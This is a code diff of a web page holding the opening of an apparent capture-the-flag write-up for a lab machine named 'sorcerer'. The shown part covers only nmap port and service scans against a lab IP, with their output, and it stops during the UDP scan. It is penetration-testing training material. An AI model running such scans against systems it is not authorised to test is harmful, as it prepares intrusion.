-  background-color: inherit;
-}
-
-.md-diagram-panel {
-  margin-top: 8px;
-}
-
-.file-list-item-file-name {
-  font-weight: initial;
-}
-
-.file-list-item-summary {
-  opacity: 1;
-}
-
-.file-list-item {
-  color: #777;
-}
-
-.file-list-item.active {
-  background-color: inherit;
-  color: black;
-}
-
-.ty-side-sort-btn.active {
-  background-color: inherit;
-}
-
-.file-list-item.active .file-list-item-file-name {
-  font-weight: bold;
-}
-
-.file-list-item {
-  opacity: 1 !important;
-}
-
-.file-library-node.active > .file-node-background {
-  background-color: rgba(32, 43, 51, 0.63);
-  background-color: var(--active-file-bg-color);
-}
-
-.file-tree-node.active > .file-node-content {
-  color: white;
-  color: var(--active-file-text-color);
-}
-
-.md-task-list-item > input {
-  margin-left: -1.7em;
-  margin-top: calc(1rem - 12px);
-  -webkit-appearance: button;
-}
-
-input {
-  border: 1px solid #aaa;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title,
-.megamenu-menu-header:hover,
-.megamenu-menu-header:focus {
-  color: inherit;
-}
-
-.dropdown-menu .divider {
-  border-color: #e5e5e5;
-  opacity: 1;
-}
-
-/* https://github.com/typora/typora-issues/issues/2046 */
-.os-windows-7 strong,
-.os-windows-7 strong {
-  font-weight: 760;
-}
-
-.ty-preferences .btn-default {
-  background: transparent;
-}
-
-.ty-preferences .window-header {
-  border-bottom: 1px dashed #202b33;
-  box-shadow: none;
-}
-
-#sidebar-loading-template,
-#sidebar-loading-template.file-list-item {
-  color: #777;
-}
-
-.searchpanel-search-option-btn.active {
-  background: #777;
-  color: white;
-}
-
-.export-detail,
-.light .export-detail,
-.light .export-item.active,
-.light .export-items-list-control {
-  background: #e0e0e0;
-  border-radius: 2px;
-  font-weight: 700;
-  color: inherit;
-}
-</style>
-<style type='text/css'  id="style-lp">ol, ul {padding-left: 40px}</style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
 <title>sorcerer</title>
+<style>
+:root {
+    --bg: #fdfbf7;
+    --text: #262220;
+    --muted: #7a736a;
+    --link: #0f5fae;
+    --border: #e7e1d6;
+    --code-bg: #eef3f8;
+    --code-border: #d3e1ee;
+    --code-text: #1f2937;
+    --code-accent: #2563eb;
+    --inline-code-bg: #eef3f8;
+    --inline-code-text: #a3271e;
+}
+
+* { box-sizing: border-box; }
+
+body {
+    font-family: "Nunito", "Apple SD Gothic Neo", "Malgun Gothic", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    margin: 0;
+    padding: 56px 20px 90px;
+    line-height: 1.75;
+    font-size: 1.05rem;
+}
+
+.page {
+    max-width: 700px;
+    margin: 0 auto;
+}
+
+.byline {
+    color: var(--muted);
+    font-size: 0.85rem;
+    letter-spacing: 0.02em;
+    margin-bottom: 6px;
+}
+
+h1 {
+    font-size: 1.55rem;
+    font-weight: 700;
+    border-bottom: 2px solid var(--text);
+    padding-bottom: 16px;
+    margin: 2.4em 0 32px;
+    line-height: 1.4;
+}
+
+/* first heading on the page sits right under the byline, not floating mid-page */
+.page > h1:first-of-type { margin-top: 10px; }
+
+.tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: -18px 0 32px;
+}
+
+.tag {
+    font-size: 0.72rem;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--muted);
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    padding: 3px 11px;
+    border-radius: 999px;
+}
+
+h2, h3, h4 {
+    font-weight: 700;
+    margin-top: 2.4em;
+    margin-bottom: 0.9em;
+    line-height: 1.4;
+}
+
+h3 { font-size: 1.2rem; }
+
+blockquote {
+    margin: 1.6em 0;
+    padding: 0.3em 1.3em;
+    border-left: 4px solid var(--border);
+    color: var(--muted);
+    font-style: italic;
+}
+
+blockquote p { margin: 0.6em 0; }
+
+mark {
+    background: #fbe89f;
+    color: inherit;
+    padding: 0.05em 0.2em;
+    border-radius: 2px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.8em 0;
+    font-size: 0.92rem;
+}
+
+th, td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+    vertical-align: top;
+}
+
+thead th { border-bottom: 2px solid var(--text); font-weight: 700; }
+
+/* [TOC] rendered nav */
+.toc {
+    font-size: 0.9rem;
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 8px;
+    padding: 16px 22px;
+    margin: 1.8em 0;
+}
+
+.toc ul { list-style: none; padding-left: 1.1em; margin: 0.3em 0; }
+.toc > ul { padding-left: 0; }
+.toc li { margin: 0.3em 0; }
+.toc a { color: var(--text); text-decoration: none; }
+.toc a:hover { color: var(--link); text-decoration: underline; }
+
+p { margin: 1.1em 0; }
+
+strong { font-weight: 700; }
+
+a { color: var(--link); text-decoration: underline; text-decoration-color: rgba(15, 95, 174, 0.35); text-underline-offset: 2px; }
+a:hover { text-decoration-color: currentColor; }
+
+hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.8em 0;
+}
+
+ul, ol { padding-left: 1.5em; margin: 1.1em 0; }
+li { margin: 0.4em 0; }
+
+/* inline code */
+code {
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    background: var(--inline-code-bg);
+    color: var(--inline-code-text);
+    padding: 0.15em 0.4em;
+    border-radius: 4px;
+    font-size: 0.82em;
+    border: 1px solid var(--code-border);
+}
+
+/* fenced code blocks: light panel, not a dark box, but still clearly set apart */
+pre {
+    background: var(--code-bg);
+    color: var(--code-text);
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--code-accent);
+    border-radius: 8px;
+    padding: 18px 20px;
+    margin: 1.8em 0;
+    overflow-x: auto;
+    box-shadow: 0 1px 3px rgba(37, 99, 235, 0.06);
+}
+
+pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: 0.86rem;
+    line-height: 1.65;
+}
+
+/* images */
+img {
+    display: block;
+    max-width: 100%;
+    height: auto;
+    margin: 2em auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    box-shadow: 0 3px 10px rgba(38, 34, 32, 0.08);
+}
+
+p:has(> img:only-child) { text-align: center; }
+
+footer {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin-top: 64px;
+    padding-top: 22px;
+    border-top: 1px solid var(--border);
+    font-size: 0.8rem;
+    color: var(--muted);
+    text-align: center;
+}
+
+@media (max-width: 600px) {
+    body { padding: 32px 16px 64px; font-size: 1.03rem; }
+    h1 { font-size: 1.3rem; }
+}
+
+.home-link {
+    position: fixed;
+    top: 16px;
+    left: 16px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 6px 14px;
+    font-size: 0.85rem;
+    color: var(--link);
+    text-decoration: none;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    z-index: 10;
+}
+
+.home-link:hover {
+    background: var(--row-hover, var(--code-bg));
+}
+
+@media (max-width: 600px) {
+    .home-link { top: 10px; left: 10px; padding: 5px 12px; font-size: 0.8rem; }
+}
+</style>
 </head>
-<body class='typora-export os-windows'><div class='typora-export-content'>
-<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#recon">Recon</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n11"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n12"><a class="md-toc-inner" href="#http-80-7742-8080">HTTP 80 7742 8080</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n15"><a class="md-toc-inner" href="#http-7742">HTTP 7742</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n39"><a class="md-toc-inner" href="#shell-as-max">Shell as <code>max</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n45"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n50"><a class="md-toc-inner" href="#shell-as-root">Shell as <code>root</code></a></span></p></div><h1 id='recon'><span>Recon</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>As always, I kicked off the machine with scanning all 65,535 TCP ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded md-focus" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap CodeMirror-focused" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 118.656px; left: 96.5469px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-14</span> <span class="cm-number">01</span>:55 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.189.100</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65525</span> closed tcp ports (reset)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp;  STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp &nbsp;  open &nbsp;<span class="cm-builtin">ssh</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp &nbsp;  open  http</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">111</span>/tcp &nbsp; open  rpcbind</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">2049</span>/tcp  open  nfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">7742</span>/tcp  open  msss</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8080</span>/tcp  open  http-proxy</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">37299</span>/tcp open  unknown</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">43301</span>/tcp open  unknown</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">44355</span>/tcp open  unknown</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">45643</span>/tcp open  unknown</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.98 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><p><span>Then I ran one more TCP scan but this time only on the discovered ports with </span><code>-sC</code><span> and </span><code>-sV</code><span> flags.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">22</span>,80,111,2049,7742,8080,37299,43301,44355,45643</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-14</span> <span class="cm-number">01</span>:56 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.189.100</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp;  STATE SERVICE  VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp &nbsp;  open &nbsp;<span class="cm-builtin">ssh</span> &nbsp; &nbsp;  OpenSSH <span class="cm-number">7</span>.9p1 Debian <span class="cm-number">10</span><span class="cm-operator">+</span>deb10u2 (protocol <span class="cm-number">2</span>.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ssh-hostkey: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">2048</span> <span class="cm-number">81</span>:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">256</span> d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_ &nbsp;<span class="cm-number">256</span> 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp &nbsp;  open  http &nbsp; &nbsp; nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: Site doesn<span class="cm-string">'t have a title (text/html).</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">111</span>/tcp &nbsp; open  rpcbind &nbsp;<span class="cm-number">2</span><span class="cm-attribute">-4</span> (RPC <span class="cm-comment">#100000)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| rpcinfo: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; program version &nbsp;  port/proto &nbsp;<span class="cm-builtin">service</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100000</span> &nbsp;<span class="cm-number">2</span>,3,4 &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">111</span>/tcp &nbsp; rpcbind</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100000</span> &nbsp;<span class="cm-number">2</span>,3,4 &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">111</span>/udp &nbsp; rpcbind</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100003</span> &nbsp;<span class="cm-number">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2049</span>/udp &nbsp; nfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100003</span> &nbsp;<span class="cm-number">3</span>,4 &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2049</span>/tcp &nbsp; nfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100005</span> &nbsp;<span class="cm-number">1</span>,2,3 &nbsp; &nbsp; &nbsp;<span class="cm-number">40470</span>/udp &nbsp; mountd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100005</span> &nbsp;<span class="cm-number">1</span>,2,3 &nbsp; &nbsp; &nbsp;<span class="cm-number">44355</span>/tcp &nbsp; mountd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100021</span> &nbsp;<span class="cm-number">1</span>,3,4 &nbsp; &nbsp; &nbsp;<span class="cm-number">43301</span>/tcp &nbsp; nlockmgr</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100021</span> &nbsp;<span class="cm-number">1</span>,3,4 &nbsp; &nbsp; &nbsp;<span class="cm-number">51802</span>/udp &nbsp; nlockmgr</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">100227</span> &nbsp;<span class="cm-number">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2049</span>/tcp &nbsp; nfs_acl</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_ &nbsp;<span class="cm-number">100227</span> &nbsp;<span class="cm-number">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2049</span>/udp &nbsp; nfs_acl</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">2049</span>/tcp  open  nfs &nbsp; &nbsp; &nbsp;<span class="cm-number">3</span><span class="cm-attribute">-4</span> (RPC <span class="cm-comment">#100003)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">7742</span>/tcp  open  http &nbsp; &nbsp; nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: SORCERER</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8080</span>/tcp  open  http &nbsp; &nbsp; Apache Tomcat <span class="cm-number">7</span>.0.4</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-favicon: Apache Tomcat</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: Apache Tomcat/7.0.4</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">37299</span>/tcp open  mountd &nbsp; <span class="cm-number">1</span><span class="cm-attribute">-3</span> (RPC <span class="cm-comment">#100005)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">43301</span>/tcp open  nlockmgr <span class="cm-number">1</span><span class="cm-attribute">-4</span> (RPC <span class="cm-comment">#100021)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">44355</span>/tcp open  mountd &nbsp; <span class="cm-number">1</span><span class="cm-attribute">-3</span> (RPC <span class="cm-comment">#100005)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">45643</span>/tcp open  mountd &nbsp; <span class="cm-number">1</span><span class="cm-attribute">-3</span> (RPC <span class="cm-comment">#100005)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.68 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 899px;"></div><div class="CodeMirror-gutters" style="display: none; height: 899px;"></div></div></div></pre><p><span>Finally, I performed a UDP port scan on the top 10 ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-14</span> <span class="cm-number">01</span>:57 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.189.100</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE &nbsp; &nbsp; &nbsp; &nbsp; SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">53</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  domain</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">67</span>/udp &nbsp; open|filtered dhcps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">123</span>/udp  closed &nbsp; &nbsp; &nbsp;  ntp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">135</span>/udp  closed &nbsp; &nbsp; &nbsp;  msrpc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">137</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-ns</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">138</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-dgm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">161</span>/udp  closed &nbsp; &nbsp; &nbsp;  snmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">445</span>/udp  closed &nbsp; &nbsp; &nbsp;  microsoft-ds</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">631</span>/udp  closed &nbsp; &nbsp; &nbsp;  ipp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1434</span>/udp closed &nbsp; &nbsp; &nbsp;  ms-sql-m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
